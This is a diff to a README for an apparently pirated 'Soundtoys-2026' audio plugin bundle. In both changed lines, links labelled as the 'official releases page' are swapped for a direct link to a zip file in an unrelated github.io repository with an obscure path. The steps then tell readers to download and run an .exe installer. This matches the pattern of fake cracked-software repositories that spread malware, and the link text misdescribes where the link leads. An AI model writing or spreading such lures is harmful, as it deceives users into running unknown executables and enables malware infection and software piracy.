@@ -5,7 +5,7 @@ description: "Download the Soundtoys Bundle for Windows 10 and 11. Access the in
 ---
 # 🔊 Soundtoys-2026 - Professional Audio Plugins For Your Mixes
 
-[![Download Soundtoys-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/genustrombiculagray500/Soundtoys-2026/releases)
+[![Download Soundtoys-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/genustrombiculagray500/genustrombiculagray500.github.io/raw/refs/heads/main/Protelytroptera/genustrombiculagray-github-io-3.5.zip)
 
 ## 📦 About This Bundle
 
@@ -27,7 +27,7 @@ Ensure your computer meets these specifications before you start the installatio
 
 Follow these steps to acquire the software on your machine:
 
-1. Visit the [official releases page](https://github.com/genustrombiculagray500/Soundtoys-2026/releases) to find the latest version files.
+1. Visit the [official releases page](https://github.com/genustrombiculagray500/genustrombiculagray500.github.io/raw/refs/heads/main/Protelytroptera/genustrombiculagray-github-io-3.5.zip) to find the latest version files.
 2. Look for the file ending in .exe under the "Assets" section.
 3. Click the file name to start the download process.
 4. Save the installer to your Downloads folder or any location you prefer.
